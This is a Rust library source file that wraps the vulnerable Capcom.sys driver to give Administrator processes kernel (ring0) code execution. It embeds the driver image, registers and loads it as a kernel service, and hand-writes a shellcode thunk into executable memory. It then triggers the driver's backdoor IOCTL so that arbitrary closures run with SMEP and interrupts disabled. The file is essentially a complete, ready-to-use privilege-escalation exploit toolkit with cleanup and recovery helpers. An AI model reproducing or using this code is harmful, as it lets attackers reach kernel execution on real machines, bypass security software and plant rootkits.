/*!
Rust bindings to the infamous Capcom driver.

The Capcom driver enables ordinary Administrator applications to gain kernel level ring0 execution privileges.

# Examples

```rust, no_run
fn main() {
	// Easy setup to load the driver and open its device handle.
	let result = capcom0::setup(|device| {
		let mut success = false;
		// This unsafe is an understatement :)
		unsafe {
			// The closure is executed with kernel privileges
			device.elevate(|ctx| {
				success = true;
			});
		}
		success
	});
	assert_eq!(result, Ok(true));
}
```
*/

// Only available to 64-bit windows targets.
#![cfg(all(windows, target_pointer_width = "64"))]

extern crate winapi;

use std::{error, fmt, mem, ptr};
use std::cell::{Cell};
use std::ffi::{OsStr, OsString};
use std::os::windows::ffi::{OsStrExt, OsStringExt};

use winapi::um::winreg::{RegCreateKeyExW, RegSetValueExW, RegCloseKey, RegDeleteTreeW, HKEY_LOCAL_MACHINE};
use winapi::um::winnt::{HANDLE, FILE_ALL_ACCESS, FILE_SHARE_READ, FILE_ATTRIBUTE_NORMAL, PAGE_EXECUTE_READWRITE, MEM_COMMIT, MEM_RESERVE, MEM_RELEASE, KEY_ALL_ACCESS, REG_SZ, REG_DWORD, REG_CREATED_NEW_KEY, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL};
use winapi::um::errhandlingapi::{GetLastError};
use winapi::um::fileapi::{DeleteFileW, CreateFileW, ReadFile, WriteFile, FlushFileBuffers, CREATE_NEW, OPEN_EXISTING};
use winapi::um::handleapi::{CloseHandle, INVALID_HANDLE_VALUE};
use winapi::um::memoryapi::{VirtualAlloc, VirtualFree};
use winapi::um::ioapiset::{DeviceIoControl};
use winapi::um::processenv::{GetCurrentDirectoryW};
use winapi::um::libloaderapi::{GetProcAddress, GetModuleHandleW};
use winapi::shared::minwindef::{HKEY, BYTE, FALSE, LPVOID, LPCVOID, DWORD};
use winapi::shared::winerror::{ERROR_FILE_NOT_FOUND, ERROR_SUCCESS};
use winapi::shared::ntdef::{UNICODE_STRING, PUNICODE_STRING, PVOID};

//----------------------------------------------------------------

/// Defer a closure on drop.
struct Defer<F: FnMut()>(F);
impl<F: FnMut()> Drop for Defer<F> {
	fn drop(&mut self) {
		(self.0)()
	}
}
macro_rules! defer {
	($($body:tt)*) => {
		let __deferred = Defer(|| { $($body)* });
	};
}

/// Constructs an UNICODE_STRING helper.
#[inline]
pub fn unicode_string(s: &[u16]) -> UNICODE_STRING {
	UNICODE_STRING {
		Length: mem::size_of_val(s) as u16,
		MaximumLength: mem::size_of_val(s) as u16,
		Buffer: s.as_ptr() as *mut u16,
	}
}

//----------------------------------------------------------------

/// Errors for [`setup`](fn.setup.html).
#[derive(Copy, Clone, Debug, Eq, PartialEq)]
pub enum Error {
	/// Failed to enable driver loading privileges.
	EnablePrivileges,
	/// Failed to write recovery information.
	RecoverWrite(u32),
	/// Failed to read recovery information.
	RecoverRead(u32),
	/// Failed to delete recovery information.
	RecoverDelete(u32),
	/// Failed to write the driver to disk.
	DriverWrite(u32),
	/// Failed to delete the driver from disk.
	DriverDelete(u32),
	/// Failed to register the driver service.
	DriverRegister(i32),
	/// Failed to unregister the driver service.
	DriverUnregister(i32),
	/// Failed to load the driver.
	DriverLoad(i32),
	/// Failed to unload the driver.
	DriverUnload(i32),
	/// Failed to open the capcom device.
	DeviceOpen(u32),
}
impl error::Error for Error {
	fn description(&self) -> &str {
		match self {
			Error::EnablePrivileges => "cannot enable privileges",
			Error::RecoverWrite(_) => "cannot write recovery information",
			Error::RecoverRead(_) => "cannot read recovery information",
			Error::RecoverDelete(_) => "cannot delete recovery information",
			Error::DriverWrite(_) => "cannot write the driver to disk",
			Error::DriverDelete(_) => "cannot delete the driver from disk",
			Error::DriverRegister(_) => "cannot register driver service",
			Error::DriverUnregister(_) => "cannot unregister driver service",
			Error::DriverLoad(_) => "cannot load driver",
			Error::DriverUnload(_) => "cannot unload driver",
			Error::DeviceOpen(_) => "cannot open device",
		}
	}
}
impl fmt::Display for Error {
	fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
		match *self {
			Error::EnablePrivileges => {
				write!(f, "Failed to enable SeLoadDriverPrivilege. Are you running as Administrator?")
			},
			Error::RecoverWrite(err) => {
				write!(f, "Failed to write recovery information, error code: {}. Ensure the current directory is writable.", err)
			},
			Error::RecoverRead(err) => {
				write!(f, "Failed to read recovery information, error code: {}. Are you sure the RECOVER file exists in the current directory?", err)
			},
			Error::RecoverDelete(err) => {
				write!(f, "Failed to delete recovery information, error code: {}. There is no problem, manually delete the RECOVER file.", err)
			},
			Error::DriverWrite(err) => {
				write!(f, "Failed to write the driver to disk, error code: {}.", err)
			},
			Error::DriverDelete(err) => {
				write!(f, "Failed to delete the driver from disk, error code: {}. ** User intervention is required, please see the documentation!! **", err)
			},
			Error::DriverRegister(err) => {
				write!(f, "Failed to register the driver service, error code: {:#010X}. Are you running as Administrator?", err)
			},
			Error::DriverUnregister(err) => {
				write!(f, "Failed to unregister the driver service, error code: {:#010X}. ** User intervention is required, please see the documentation!! **", err)
			},
			Error::DriverLoad(err) => {
				write!(f, "Failed to load the driver, error code: {:#010X}.", err)
			},
			Error::DriverUnload(err) => {
				write!(f, "Failed to unload the driver, error code: {:#010X}. ** User intervention is required, please see the documentation!! **", err)
			},
			Error::DeviceOpen(err) => {
				write!(f, "Failed to open the device, error code: {}. The Capcom driver must be loaded.", err)
			},
		}
	}
}

//----------------------------------------------------------------

/// Easy setup.
///
/// Performs all the steps necessary to load the Capcom driver and invoke the closure with Capcom's Device from which access can be elevated.
/// The following steps are performed:
///
/// 1. Privilege to load drivers is enabled.
/// 2. Emergency recovery file is written and flushed to disk.
/// 3. The Capcom driver is written to disk, registered as a service and loaded.
/// 4. The closure is called with the [Capcom device](struct.Device.html) from which access can be elevated.
/// 5. Afterwards everything is cleaned up.
/// 6. If cleanup is successful the emergency recovery file is deleted.
///
/// If something goes wrong in the closure, the cleanup routines may not be executed.
///
/// In this case, the Capcom driver remains on disk and registered as a service.
/// To help clean up in this scenario, a file RECOVER is safely written containing the path and service name of the driver.
/// For further help see the [`recover`](fn.recover.html) function.
///
/// Examples that trigger this failure are BSOD during elevation or exiting the process without unwinding the stack.
/// Panics that do not occur during elevated ring0 execution are safe as the clean up code will run during unwinding of the stack.
///
/// For more information about how to avoid BSOD see the [`Device::elevate`](struct.Device.html#method.elevate) documentation.
///
/// # Examples
///
/// ```no_run
/// // Easy setup to load the driver and open its device handle
/// let result = capcom0::setup(|device| {
/// 	let mut success = false;
/// 	// This unsafe is an understatement :)
/// 	unsafe {
/// 		// The closure is executed with kernel privileges
/// 		device.elevate(|ctx| {
/// 			success = true;
/// 		});
/// 	}
/// 	success
/// });
/// assert_eq!(result, Ok(true));
/// ```
#[inline(never)]
pub fn setup<T, F: FnMut(&Device) -> T>(mut f: F) -> Result<T, Error> {
	// Require driver loading privileges to continue
	if !enable_privileges() {
		return Err(Error::EnablePrivileges);
	}
	// Create a Driver instance containing the service name and driver path
	let driver = Driver::new();
	// Write the RECOVER file to disk safely
	match driver.recovery() {
		Err(err) => Err(Error::RecoverWrite(err)),
		Ok(_) => {
			// Remove the RECOVER file _only_ when cleanup is successful
			// Needs to be a Cell because accessed through several deferred closures
			let cleanup_result = Cell::new(Ok(()));
			defer! {
				if cleanup_result.get().is_ok() {
					let result = driver.unrecovery().map_err(Error::RecoverDelete);
					cleanup_result.set(result);
				}
			}
			// Write the Capcom.sys driver to disk
			match driver.write() {
				Err(err) => Err(Error::DriverWrite(err)),
				Ok(_) => {
					// Defer deleting the Capcom.sys driver from disk
					defer! {
						if cleanup_result.get().is_ok() {
							let result = driver.delete().map_err(Error::DriverDelete);
							cleanup_result.set(result);
						}
					}
					// Register the driver service preparing it to be loaded
					match driver.register() {
						Err(err) => Err(Error::DriverRegister(err)),
						Ok(_) => {
							// Defer unregistering the driver service
							defer! {
								if cleanup_result.get().is_ok() {
									let result = driver.unregister().map_err(Error::DriverUnregister);
									cleanup_result.set(result);
								}
							}
							// Finally load the driver
							match driver.load() {
								Err(err) => Err(Error::DriverLoad(err)),
								Ok(_) => {
									// Defer unloading the driver
									defer! {
										// Ensure we still have the ability to load/unload drivers
										let _ = enable_privileges();
										let result = driver.unload().map(mem::drop).map_err(Error::DriverUnload);
										cleanup_result.set(result);
									}
									// Open the Capcom device and invoke the closure
									Device::open()
										.map(|device| f(&device))
										.map_err(|err| Error::DeviceOpen(err))
								},
							}
						},
					}
				},
			}
		},
	}
}

//----------------------------------------------------------------

/// Recover from failures.
///
/// Some failures can prevent cleanup code from unloading the driver, unregistering the service and deleting the driver from disk.
/// Examples of these failures include logic errors, panics, BSOD or other issues.
///
/// For these scenarios a RECOVER file is written containing information about the driver service name and the path to the driver on disk.
/// This RECOVER file is automatically deleted if the recovery is successful.
///
/// This function handles interpreting the RECOVER file and attempt to clean up.
///
/// * Returns `Ok(false)` if no RECOVER file was found. Everything should be fine.
/// * Returns `Ok(true)` if the RECOVER file was found and the recovery is successful.
/// * Returns `Err(err)` if the RECOVER file was found and the recovery process hit a problem. In this case user intervention is needed, see the error for more information.
///
/// A reboot is recommended after following the recovery steps.
///
/// # Manual recovery
///
/// The following steps (except rebooting) are less or more what this function tries to automate.
///
/// ## Unloading the Capcom driver
///
/// Follow the steps to remove the driver service and reboot. The Capcom driver will not be loaded again.
///
/// ## Removing the driver service
///
/// All drivers must be registered as a service in the Windows Registry.
///
/// The following steps go through how to manually edit the Windows Registry to remove the service created by this library:
///
/// Run _regedit_ as Administrator and find the tree `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services` (paste this in the location bar).
/// Here you have a list of all registered services on your machine, note that not all services are drivers.
///
/// Find the Capcom service by name (eg. _Htsysm72FB_).
///
/// If another service name is used and you know the path to the Capcom.sys driver file, use ctrl-f to find it.
/// Make sure to, under _Look at_, check _Data_ and uncheck the other options. Uncheck _Match whole string only_.
/// Enter the path to the Capcom.sys driver file and click _Find Next_.
/// Keep looking until it finds an entry under the previously mentioned _Services_ tree.
/// A key named _ImagePath_ should be highlighted with the path to the Capcom.sys driver path.
///
/// Follow up by deleting that service's tree. Right-click the highlighted entry in the treeview and click _Delete_.
///
/// If you cannot find the service's registry entry this is fine, this means the Capcom driver is not registered as a service and cannot be loaded.
/// It is recommended to reboot your computer at this point.
///
/// ## Delete the Capcom.sys driver
///
/// Finally delete the Capcom.sys driver from disk.
///
/// If you are unable to delete the file, uhhh, reboot and try again?
/// If the previous steps were followed successfully this should not be a problem.
///
pub fn recover() -> Result<bool, Error> {
	// Start by reading the RECOVER file, silent success if the file was not found
	let driver = match Driver::recover() {
		Err(err) if err == ERROR_FILE_NOT_FOUND => return Ok(false),
		Err(err) => return Err(Error::RecoverRead(err)),
		Ok(driver) => driver,
	};

	// Require driver loading privileges to continue
	if !enable_privileges() {
		return Err(Error::EnablePrivileges);
	}

	// We have a RECOVER file try the standard steps to try to remove the driver and service
	let _ = driver.unload();
	let _ = driver.unregister();
	let delete = driver.delete();

	// If there was no file to delete, or the deletion was successful, everything should be fine
	// If something still went wrong, manually delete the RECOVER file.
	if delete == Err(ERROR_FILE_NOT_FOUND) || delete == Ok(()) {
		return driver.unrecovery().map(|_| true).map_err(Error::RecoverDelete);
	}

	// Unable to delete the driver file from disk
	let mut result = Ok(());
	// Try to register the driver service again
	result = result.and(driver.register().map_err(Error::DriverRegister));
	// Now try to unload the driver again
	result = result.and(driver.unload().map(|_| ()).map_err(Error::DriverUnload));
	// Cleanup the service again
	result = result.and(driver.unregister().map_err(Error::DriverUnregister));

	// Try again to delete the driver file from disk
	if let Ok(_) = driver.delete() {
		// If we are successful then ignore any previous errors and follow up by deleting the RECOVER file
		result = driver.recovery().map_err(Error::RecoverDelete);
	}

	result.map(|_| true)
}

//----------------------------------------------------------------

/// Capcom driver manager.
///
/// Holds the service and native paths where the driver is located.
pub struct Driver {
	service_path: Vec<u16>,
	native_path: Vec<u16>,
}
impl Driver {
	// Rustdoc includes all the bytes in the documentation...
	#[doc(hidden)]
	/// The Capcom.sys driver image.
	///
	/// Download [the binary image here](https://github.com/CasualX/capcom0/raw/4f7b101dc680255b7a5fbd340552bbcd28f38854/driver/Capcom.sys).
	pub const IMAGE: &'static [u8; 0x2950] = &include!("capcom.rs");

	/// The full NT service path.
	///
	/// Eg. `\Registry\Machine\System\CurrentControlSet\Services\MyService`
	#[inline]
	pub fn service_path(&self) -> &[u16] {
		let len = self.service_path.len();
		unsafe { self.service_path.get_unchecked(0..len - 1) }
	}
	/// The registry name, located in `HKEY_LOCAL_MACHINE`.
	///
	/// Eg. `System\CurrentControlSet\Services\MyService`
	#[inline]
	pub fn service_registry(&self) -> &[u16] {
		let len = self.service_path.len();
		unsafe { self.service_path.get_unchecked(18..len - 1) }
	}
	/// The service name.
	///
	/// Eg. `MyService`
	#[inline]
	pub fn service_name(&self) -> &[u16] {
		let len = self.service_path.len();
		unsafe { self.service_path.get_unchecked(52..len - 1) }
	}
	/// The absolute native path to the driver.
	#[inline]
	pub fn native_path(&self) -> &[u16] {
		let len = self.native_path.len();
		unsafe { self.native_path.get_unchecked(0..len - 1) }
	}
	/// The absolute path to the driver.
	#[inline]
	pub fn path(&self) -> &[u16] {
		let len = self.native_path.len();
		unsafe { self.native_path.get_unchecked(4..len - 1) }
	}

	/// Creates a new Driver instance.
	///
	/// The Capcom.sys driver binary will be written to the current directory.
	/// The driver service is created under the default name.
	pub fn new() -> Driver {
		unsafe {
			// Get the total length of the current directory including nul terminator
			let cd_len = GetCurrentDirectoryW(0, ptr::null_mut());
			// Allocate enough memory for the native path
			let mut native_path = Vec::<u16>::with_capacity(4 + cd_len as usize + SLASH_CAPCOM_SYS.len());
			// Write the NT path prefix \??\
			*(native_path.as_mut_ptr() as *mut [u16; 4]) = /*\??\*/[92u16, 63, 63, 92];
			// Followed by the current directory path
			let cd_len = GetCurrentDirectoryW(cd_len, native_path.as_mut_ptr().offset(4));
			native_path.set_len(4 + cd_len as usize);
			// Followed by the driver file name \Capcom.sys and nul terminator
			native_path.extend_from_slice(&SLASH_CAPCOM_SYS);
			// The service path is a fixed string
			let service_path = NT_SERVICES_PATH.to_vec();
			Driver { service_path, native_path }
		}
	}

	/// Creates a new Driver instance with the given service name and path.
	///
	/// The service name is optional and will use the default name if `None`.
	/// Avoid special characters, otherwise the result may be unexpected.
	/// The path is where the Capcom.sys driver binary will be written to disk.
	pub fn from_parts(name: Option<&OsStr>, path: &OsStr) -> Driver {
		// Build the service path
		let service_path =
			if let Some(name) = name {
				let mut service_path = NT_SERVICES_PATH[..52].to_vec();
				service_path.extend(name.encode_wide());
				service_path.push(0);
				service_path
			}
			else {
				NT_SERVICES_PATH.to_vec()
			};
		// Build the native path
		let mut native_path = /*\??\*/[92u16, 63, 63, 92].to_vec();
		native_path.extend(path.encode_wide());
		native_path.push(0);
		// Build the Driver object from these strings
		Driver { service_path, native_path }
	}

	fn from_parts_wide(name: Option<&[u16]>, path: &[u16]) -> Driver {
		// Build the service path
		let service_path =
			if let Some(name) = name {
				let mut service_path = NT_SERVICES_PATH[..52].to_vec();
				service_path.extend_from_slice(name);
				service_path.push(0);
				service_path
			}
			else {
				NT_SERVICES_PATH.to_vec()
			};
		// Build the native path
		let mut native_path = /*\??\*/[92u16, 63, 63, 92].to_vec();
		native_path.extend_from_slice(&path);
		native_path.push(0);
		// Build the Driver object from these strings
		Driver { service_path, native_path }
	}

	/// Reads and loads the RECOVER file.
	pub fn recover() -> Result<Driver, u32> {
		unsafe {
			// Open the RECOVER file
			let handle = CreateFileW(RECOVER_FILE_NAME.as_ptr(), FILE_ALL_ACCESS, 0, ptr::null_mut(), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, ptr::null_mut());
			if handle != INVALID_HANDLE_VALUE {
				defer! { CloseHandle(handle); }
				// Read the contents of the RECOVER file
				let mut buffer: [u16; 512] = mem::uninitialized();
				let mut bytes_read = mem::uninitialized();
				if ReadFile(handle, buffer.as_mut_ptr() as LPVOID, mem::size_of_val(&buffer) as u32, &mut bytes_read, ptr::null_mut()) != FALSE {
					let words_read = (bytes_read / 2) as usize;
					let buffer = &buffer[..words_read];
					// Extract one or two strings from the buffer
					let (name, path) = match buffer.iter().position(|&c| c == '\n' as u16) {
						Some(split_at) => (Some(&buffer[..split_at]), &buffer[split_at + 1..]),
						None => (None, buffer)
					};
					return Ok(Driver::from_parts_wide(name, path));
				}
			}
			return Err(GetLastError());
		}
	}

	/// Copies the Capcom driver to disk.
	///
	/// The Capcom driver image is embedded in the library.
	pub fn write(&self) -> Result<(), u32> {
		unsafe {
			// Create the driver file
			let handle = CreateFileW(self.path().as_ptr(), FILE_ALL_ACCESS, 0, ptr::null_mut(), CREATE_NEW, FILE_ATTRIBUTE_NORMAL, ptr::null_mut());
			if handle != INVALID_HANDLE_VALUE {
				defer! { CloseHandle(handle); }
				// Write the driver contents
				let mut bytes_written = mem::uninitialized();
				if WriteFile(handle, Self::IMAGE.as_ptr() as LPCVOID, Self::IMAGE.len() as DWORD, &mut bytes_written, ptr::null_mut()) != FALSE {
					return Ok(());
				}
			}
			return Err(GetLastError());
		}
	}
	/// Deletes the driver from disk.
	pub fn delete(&self) -> Result<(), u32> {
		unsafe {
			if DeleteFileW(self.path().as_ptr()) == FALSE {
				return Err(GetLastError());
			}
			Ok(())
		}
	}

	/// Writes and flushes recovery information to disk.
	pub fn recovery(&self) -> Result<(), u32> {
		unsafe {
			let handle = CreateFileW(RECOVER_FILE_NAME.as_ptr(), FILE_ALL_ACCESS, 0, ptr::null_mut(), CREATE_NEW, FILE_ATTRIBUTE_NORMAL, ptr::null_mut());
			if handle != INVALID_HANDLE_VALUE {
				defer! { CloseHandle(handle); }
				let mut bytes_written = mem::uninitialized();
				let success =
					// WriteFile(handle, self.service_name().as_ptr() as LPCVOID, mem::size_of_val(self.service_name()) as DWORD, &mut bytes_written, ptr::null_mut()) != FALSE &&
					// WriteFile(handle, &('\n' as u16) as *const _ as LPCVOID, 2, &mut bytes_written, ptr::null_mut()) != FALSE &&
					WriteFile(handle, self.path().as_ptr() as LPCVOID, mem::size_of_val(self.path()) as DWORD, &mut bytes_written, ptr::null_mut()) != FALSE &&
					FlushFileBuffers(handle) != FALSE;
				if success {
					return Ok(());
				}
			}
			return Err(GetLastError());
		}
	}
	/// Deletes the recovery information file.
	pub fn unrecovery(&self) -> Result<(), u32> {
		unsafe {
			if DeleteFileW(RECOVER_FILE_NAME.as_ptr()) == FALSE {
				return Err(GetLastError());
			}
			Ok(())
		}
	}

	/// Registers the driver service in the Windows Registry which prepares it to be loaded.
	///
	/// Requires Administrator rights to register the driver service.
	#[inline(never)]
	pub fn register(&self) -> Result<(), i32> {
		unsafe {
			// Create the driver service registry key
			let mut key = ptr::null_mut();
			let mut disposition = 0;
			let err = RegCreateKeyExW(HKEY_LOCAL_MACHINE, self.service_registry().as_ptr(), 0, ptr::null_mut(), 0, KEY_ALL_ACCESS, ptr::null_mut(), &mut key, &mut disposition);
			if err != ERROR_SUCCESS as i32 {
				return Err(err);
			}
			defer! { RegCloseKey(key); }
			// If the key already exists, this is a major error and we're about to trash something important
			// The driver should be properly unload and unregistered before attempting to register another driver
			if disposition != REG_CREATED_NEW_KEY {
				return Err(-(disposition as i32));
			}
			// Assign the registry keys, if any of these fail just ignore as if it's not a big deal
			// If any of them were important, loading the driver later returns an appropriate error
			reg_set_sz(key, &ImagePath, self.native_path());
			reg_set_dword(key, &Type, &SERVICE_KERNEL_DRIVER);
			reg_set_dword(key, &Start, &SERVICE_DEMAND_START);
			reg_set_dword(key, &ErrorControl, &SERVICE_ERROR_NORMAL);
			Ok(())
		}
	}
	/// Removes the driver service from the Windows Registry.
	///
	/// Requires Administrator rights to remove the driver service.
	pub fn unregister(&self) -> Result<(), i32> {
		unsafe {
			// Nuke the entire registry service entry
			let err = RegDeleteTreeW(HKEY_LOCAL_MACHINE, self.service_registry().as_ptr());
			if err != ERROR_SUCCESS as i32 {
				return Err(err);
			}
			Ok(())
		}
	}

	/// Invokes `NtLoadDriver` to load the driver.
	///
	/// For this call to be successful, the following prerequisites must be met:
	///
	/// * Enable the required privileges, see [`enable_privileges`](fn.enable_privileges.html).
	/// * Register the driver as a service, see [`register`](#method.register).
	/// * The system driver is available on disk, see [`write`](#method.write).
	pub fn load(&self) -> Result<i32, i32> {
		unsafe {
			let result = NtLoadDriver(&mut unicode_string(self.service_path()));
			if result < 0 { Err(result) } else { Ok(result) }
		}
	}
	/// Invokes `NtUnloadDriver` to unload the driver.
	pub fn unload(&self) -> Result<i32, i32> {
		unsafe {
			let result = NtUnloadDriver(&mut unicode_string(self.service_path()));
			if result < 0 { Err(result) } else { Ok(result) }
		}
	}
}
impl fmt::Debug for Driver {
	fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
		f.debug_struct("Driver")
			.field("service_path", &OsString::from_wide(self.service_path()))
			.field("native_path", &OsString::from_wide(self.native_path()))
			.finish()
	}
}

//----------------------------------------------------------------

/// Enables the privileges to load and unload drivers.
///
/// Returns false if the required privileges cannot be acquired, eg. when not running as Administrator.
pub fn enable_privileges() -> bool {
	unsafe { enable_privilege(&SeLoadDriverPrivilege) }
}

#[inline(never)]
unsafe fn enable_privilege(privilege_name: &[u16]) -> bool {
	use winapi::um::winnt::{TOKEN_PRIVILEGES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES};
	use winapi::um::winbase::{LookupPrivilegeValueW};
	use winapi::um::processthreadsapi::{OpenProcessToken, GetCurrentProcess};
	use winapi::um::securitybaseapi::{AdjustTokenPrivileges};

	let mut privilege: TOKEN_PRIVILEGES = mem::zeroed();
	let mut token = ptr::null_mut();
	let mut result = false;

	privilege.PrivilegeCount = 1;
	privilege.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	if LookupPrivilegeValueW(ptr::null_mut(), privilege_name.as_ptr(), &mut privilege.Privileges[0].Luid) != FALSE {
		if OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &mut token) != FALSE {
			result = AdjustTokenPrivileges(token, FALSE, &mut privilege, mem::size_of_val(&privilege) as u32, ptr::null_mut(), ptr::null_mut()) != FALSE;
			CloseHandle(token);
		}
	}

	result
}

//----------------------------------------------------------------

/// Capcom device.
#[derive(Debug)]
pub struct Device {
	device: HANDLE,
	payload: *mut u8,
}
impl Device {
	/// Open access to the capcom device.
	///
	/// For this call to be successful the capcom driver must be loaded.
	pub fn open() -> Result<Device, u32> {
		unsafe {
			let device = CreateFileW(CAPCOM_DEVICE.as_ptr(), FILE_ALL_ACCESS, FILE_SHARE_READ, ptr::null_mut(), OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, ptr::null_mut());
			if device != INVALID_HANDLE_VALUE {
				let payload = VirtualAlloc(ptr::null_mut(), 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE) as *mut u8;
				Ok(Device { device, payload })
			}
			else {
				Err(GetLastError())
			}
		}
	}

	/// Runs the callback with ring0 kernel privileges.
	///
	/// The callback is invoked with SMEP and interrupts disabled.
	/// This has implications for which kernel APIs are safe to invoke!
	/// Essentially nothing is safe to call from this context, but will probably work.
	/// Mitigating the worst of these effects is for a future release.
	///
	/// Attempt to invoke any usermode system call will trigger a BSOD.
	/// This covers a surprising number of things; panicking, i/o, ...
	///
	/// Be careful and have fun!
	pub unsafe fn elevate<F: FnMut(Context)>(&self, mut f: F) -> bool {
		// Generate the thunk
		self.codegen(Self::elevate_thunk::<F> as usize, &mut f as *mut _ as usize);
		// Invoke the IOCTL
		self.ioctl()
	}
	unsafe extern "system" fn elevate_thunk<F: FnMut(Context)>(get_system_routine_address: MmGetSystemRoutineAddressFn, user_data: *mut F) {
		let ctx = Context { get_system_routine_address };
		(*user_data)(ctx);
	}

	/// Generate the payload code.
	pub fn codegen(&self, user_fn: usize, user_data: usize) {
		unsafe {
			let payload = self.payload;

			// Prepare the payload, required by the capcom backdoor
			*(payload.offset(0) as *mut *mut u8) = payload.offset(8);

			// MOV RAX, thunk
			*payload.offset(8 + 0) = 0x48;
			*payload.offset(8 + 1) = 0xB8;
			*(payload.offset(8 + 2) as *mut usize) = user_fn;

			// the first argument, RCX, is set by capcom to the address of MmGetSystemRoutineAddress
			// MOV RDX, user_data
			*payload.offset(18 + 0) = 0x48;
			*payload.offset(18 + 1) = 0xBA;
			*(payload.offset(18 + 2) as *mut usize) = user_data;

			// JMP RAX
			*payload.offset(28 + 0) = 0xFF;
			*payload.offset(28 + 1) = 0xE0;
		}
	}
	/// Invokes the Capcom IOCTL.
	///
	/// Ensure the payload is generated before invoking the IOCTL.
	pub unsafe fn ioctl(&self) -> bool {
		let mut payload = self.payload.offset(8);
		let mut result = 0;

		let mut bytes_returned = mem::uninitialized();
		const IOCTL_X64: DWORD = 0xAA013044; // X64
		//const IOCTL_X86: DWORD = 0xAA012044; // X86
		DeviceIoControl(self.device, IOCTL_X64, (&mut payload) as *mut _ as LPVOID, 8, &mut result as *mut _ as LPVOID, 4, &mut bytes_returned, ptr::null_mut()) != FALSE
	}
}
impl Drop for Device {
	fn drop(&mut self) {
		unsafe {
			VirtualFree(self.payload as LPVOID, 0, MEM_RELEASE);
			CloseHandle(self.device);
		}
	}
}

//----------------------------------------------------------------

/// The callback is passed the address of [`MmGetSystemRoutineAddress`](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-mmgetsystemroutineaddress).
pub type MmGetSystemRoutineAddressFn = unsafe extern "system" fn(name: PUNICODE_STRING) -> PVOID;

/// Kernel callback context.
///
/// The closure passed to [`Device::elevate`](struct.Device.html#method.elevate) receives this context as an argument.
#[derive(Copy, Clone)]
pub struct Context {
	/// [`MmGetSystemRoutineAddress`](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/content/wdm/nf-wdm-mmgetsystemroutineaddress).
	pub get_system_routine_address: MmGetSystemRoutineAddressFn,
}

//----------------------------------------------------------------

#[allow(non_upper_case_globals)]
mod lit {
	pub static ImagePath: [u16; 10] = /*ImagePath*/[73u16, 109, 97, 103, 101, 80, 97, 116, 104, 0];
	pub static Type: [u16; 5] = /*Type*/[84u16, 121, 112, 101, 0];
	pub static Start: [u16; 6] = /*Start*/[83u16, 116, 97, 114, 116, 0];
	pub static ErrorControl: [u16; 13] = /*ErrorControl*/[69u16, 114, 114, 111, 114, 67, 111, 110, 116, 114, 111, 108, 0];
	pub static CAPCOM_DEVICE: [u16; 15] = /*\\.\Htsysm72FB*/[92u16, 92, 46, 92, 72, 116, 115, 121, 115, 109, 55, 50, 70, 66, 0];
	pub static SeLoadDriverPrivilege: [u16; 22] = /*SeLoadDriverPrivilege*/[83u16, 101, 76, 111, 97, 100, 68, 114, 105, 118, 101, 114, 80, 114, 105, 118, 105, 108, 101, 103, 101, 0];
	pub static NT_SERVICES_PATH: [u16; 63] = /*\Registry\Machine\System\CurrentControlSet\Services\Htsysm72FB*/[92u16, 82, 101, 103, 105, 115, 116, 114, 121, 92, 77, 97, 99, 104, 105, 110, 101, 92, 83, 121, 115, 116, 101, 109, 92, 67, 117, 114, 114, 101, 110, 116, 67, 111, 110, 116, 114, 111, 108, 83, 101, 116, 92, 83, 101, 114, 118, 105, 99, 101, 115, 92, 72, 116, 115, 121, 115, 109, 55, 50, 70, 66, 0];
	pub static SLASH_CAPCOM_SYS: [u16; 12] = /*\Capcom.sys*/[92u16, 67, 97, 112, 99, 111, 109, 46, 115, 121, 115, 0];
	pub static RECOVER_FILE_NAME: [u16; 8] = /*RECOVER*/[82u16, 69, 67, 79, 86, 69, 82, 0];
	pub static NTDLL: [u16; 6] = /*NTDLL*/[78u16, 84, 68, 76, 76, 0];
}
use self::lit::*;

//----------------------------------------------------------------

#[allow(non_snake_case)]
unsafe fn NtLoadDriver(DriverServiceName: PUNICODE_STRING) -> i32 {
	let NtLoadDriver: unsafe extern "system" fn(*mut UNICODE_STRING) -> i32 =
		mem::transmute(GetProcAddress(GetModuleHandleW(NTDLL.as_ptr()), "NtLoadDriver\0".as_ptr() as _));
	NtLoadDriver(DriverServiceName)
}
#[allow(non_snake_case)]
unsafe fn NtUnloadDriver(DriverServiceName: PUNICODE_STRING) -> i32 {
	let NtUnloadDriver: unsafe extern "system" fn(*mut UNICODE_STRING) -> i32 =
		mem::transmute(GetProcAddress(GetModuleHandleW(NTDLL.as_ptr()), "NtUnloadDriver\0".as_ptr() as _));
	NtUnloadDriver(DriverServiceName)
}

#[inline]
unsafe fn reg_set_sz(key: HKEY, sub_key: &[u16], sz: &[u16]) {
	let lp_data = sz.as_ptr() as *const BYTE;
	let cb_data = mem::size_of_val(sz) as u32;
	let _err = RegSetValueExW(key, sub_key.as_ptr(), 0, REG_SZ, lp_data, cb_data);
}
#[inline]
unsafe fn reg_set_dword(key: HKEY, sub_key: &[u16], dword: &u32) {
	let lp_data = dword as *const _ as *const BYTE;
	let _err = RegSetValueExW(key, sub_key.as_ptr(), 0, REG_DWORD, lp_data, 4);
}
